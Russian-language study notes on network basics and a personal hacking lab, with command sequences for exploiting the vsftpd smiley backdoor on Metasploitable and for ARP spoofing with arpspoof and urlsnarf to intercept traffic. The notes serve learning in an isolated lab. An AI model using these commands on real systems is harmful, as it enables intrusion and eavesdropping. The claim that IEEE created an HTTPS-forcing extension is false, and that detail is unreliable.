Общее описание сети

Для начала я бы хотел разобраться с сетевыми технологиями.
И так, сеть в целом можно представить как круглый стол, а вместо людей сидящих за ним, устройства, которые так-же как и люди общаются 
между собой. Это могут быть как и оконечные узлы(устройства, которые преобразуют пользовательскую информацию в данные для 
передачи по линии связи и осуществляющее обратное преобразование, wifi или bluetooth адаптер), так
и промежуточные устройства(устройства, которые соединяют эти устройства, коммутаторы, маршрутизаторы, модемы), а среды
между ними называются сетевыми(кабель, оптический канал). У людей за круглым столом есть ряд правил, в сети они называются  - протоколы. 
В ним может установка соединяния, скорость соединяния, и сколько времени ждать, формат данных и в каком виде они будут представлены
что делать с случае ошибок, и закрытие соединяния.
Однако если собрать слишком большую компанию, то возникнет ряд проблем:
Кто-то не услышит информацию, В некоторых случаях лучше обратиться лично к человеку, 
а также лучше разбить их всех на маленькие группы иначе только один будет говорить
Для этого и нужны промежуточные устройства.

Пакеты и адрес, ARP-спуфинг

Вся информация в сети передается пакетами, их можно представить, как конверты, на которых есть отправитель и получатель, только вместо имен и адреса, MAC и IP адреса
И так, MAC адрес - адрес у сетевой карты, которая и подключает ноутбук или компьютер к wifi, этот адрес можно представить как имя. Перед отправкой информации
маршрутизатор помечает соотвествующий пакет MAC адресом устройства, а потом передает его в виде радиосигнала. Все устройства подключенные к этой сети, получают
этот радиосигнал и проверяют MAC адрес пакета, чтобы выяснить, кому он предназначен. Как правило этот адрес - 48 битное значение записанное в 16 системе счисления.
Что же такое IP-адрес. Сеть состоит из иерархических регионов(условно: глобальных провайдер, национальный, местный, а уже потом маршрутизатор wifi и модем,)
IP-адрес можно предствить, как место в сети, поэтому если перейти из одного кафе в другое, то MAC-адрес останится прежним, а вот IP-адрес поменяется.
Как выглядит поиск информации в браузере, сначала веб-запрос идет в сетевую карту, затем на маршрутизатор, который установлен например в кафе, 
затем запрос отправляется мультиплексору(устройства, которое позволяет передавать интренет-трафик, по проводам, а так-же может различать интренет сигнал
от телевизионного => можно подключить телевизор и маршрутизатор к одну и тому же разьему), который передает запрос на маршрутизатор интернет-провайдера,
который в свою очередь и маршрутизаторы провайдера сравнивают префиксы IP-адреса в поиске совпадений, и так пакет доходит до нижнего уровня, на котором отсутствуют
другие маршрутизаторы, и ипользует MAC-адрес для определения пункта назначения запроса, этот уровень называется LAN - local area network(локальный вычислительный 
уровень). После этого маршрутизатор отправляет всем устройствам, которые подключены к сети, преслать свой MAC-адрес, а потом он сопостовляет IP и MAC адрес в 
ARP-таблице, что не делать это повторно. 
ЕСЛИ ВКРАТЦЕ - MAC-адрес идентифицирует компьютер, IP-адрес определяет его местоположение, а ARP-таблицы хранят результаты сопостовляя этих фрагментов информации.
При ARP спуфинг злоумышленник хочет выдать себя за кого-то другого.



Короче я сейчас должен создать несколько виртуальных машин:
1. kali linux - основная система с которой я буду проводить атаки
2. ubuntu desktop - одну под одного пользователя, другую как сервер
3. Metaspoitable - сервер linux, который специально будет уязвимым, и на котоурый бдут проводиться атаки
4. pfSense - маршрутизатор
pfSense можно предствить в качестве привратника, который стоит между интренетом 
и внутренней сетью. Он проверяет входящий и исходящий трафик, чтобы убедиться в том
внутренняя сеть защищена от атак извне. Он помогается создать машины, которые будет
уязвимы и только пользователь сможет их атаковать.
а Metaspoitable - это машина, которые мы будет взламывать, но сначала ее нужно ограничить
от доступа к ней другим пользавателям, для этого как-раз и нужен pfsense.

Инструмент netdiscover - утилита, которая сканирует сеть, рассылая ARP-запросы по всем IP-адресам в подсети, а потом соотвественно сопостовляет MAC и IP адреса,
кроме того выводит еще прозводителя сетевой карты по MAC-адресу. Как правило машины с наименьшим IP-адресом является маршрутизатором

"Бэкдор"
Первая тестовая атака будет совершена на Metaspoitable, при помощи уязвимость  "бэкдор".
Бэкдор - кусок вредоносного кода в opensource софте, позволяющий злоумышленнику получить
к ней несанкционированный доступ.
Этот бэкдор, который я буду использовать, который был исправлен в 2011, давал доступ к 
терминалу на скомпроментированной машине. Для этого было достаточно пройти аутентификацию
на FTP сервере, ввидя любое имя пользователя, которое заканчивалось на :), и любой пароль.
После активации атаки на порте 6200 открывалась оболочка терминала shell, и теперь можно 
управлять чужой машиной удаленно.  
Список команд:
sudo netdiscover
сканирует сеть
nc <IP-адрес сервера> 21
авторизация на сервере
user <любое имя>:)
pass <любой пароль> 
nc -v <IP-адрес сервера> 6200
активация порта 6200 на сервере
далее можно делать с сервером все что угодно

ARP-спуфинг
Короче, при этом методе атаки есть два этапа, первый - злоумышленник заставляет думать устройство жертвы, что его компьютер маршрутизатор(он отправляет
жертве поддельный ARP-ответ с информацей, что MAC-адрес соотвествует IP-адресу маршрутизатора), второй - компьютер жертвы принимает поддельный ARP-пакет и 
обновляет информацию в ARP-таблице, чтобы отразить соответствие MAC-адреса злоумышленника  IP-адресу маршрутизатора. После этого интернет-трафик, будет отправляться
злоумышленнику, после анализа которого, он может отправить его маршрутизатору.
Условно это можно предствить, как когда вор, говорит клиенту почты, что он почтальон, клиент отдает ему письмо, а вор после того как прочитал письмо, отдает
его реальному работнику почты.
Если злоумышленник хочет также получать ответный трафик, то его надо провернуть тоже самое, только для маршрутизатора.
Сначала нужно просканировать сеть при помощи netdiscover, далее нунжо разрешить машине Kali linux рассылать пакеты от имени других машин, включив пересылку IP-адресов
sudo netdiscover
сканирует сеть
echo 1 > /pros/sys/net/ipv4/ip_forward
разрешение на отправку пакетов от имено другой машины
arpspoof -i <port> -t <IP-адрес жертвы> <IP-адрес маршрутизатора>
отправка ложного ARP-пакета, который заставляет думать машину жертвы, что машина злоумышленника маршрутизатор
флаг -t обозначает цель, а -i интерфейс сетевой карты
arpspoof -i <port> -t <IP-адрес маршрутизатора> <IP-адрес жертвы> 
после этого необходимо заставить думать маршрутизатор, что машина злоумышленника - машина жертвы, для этого надо в томже запросе просто поменять местами IP-адреса
urlsnarf -i <port>
показывает трафик жертвы

В целом компьютер злоумышленника может получать не только url, но и в целом все пакеты отправленные или полученные жертвой. Это означает, что
он может просматривать всю незаршифрованную информацию жертвы.

После выполянения атаки, нельзя оставлять ARP-таблицу в поврежденном состоянии, иначе у жертвы не будет работать интернет, нужно вернуть ее в прежнее состояние, 
для этого можно просто завершить команды, которые отправляют ARP-пакеты машине жертвы и маршрутизатору

Защита от этой атаки
Все пакеты отправленные через HTTPS-соединение являются защифрованными, то-есть их нельзя посмотреть такой атакой, поэтому университет IEEE создал расширение
для всех популярных браузеров, которое обеспечивает, что весь сетевой трафик будет проходить через HTTPS-соединение.
Теперь я напишу скрипт, который будет обнаруживать ARP-спуфинг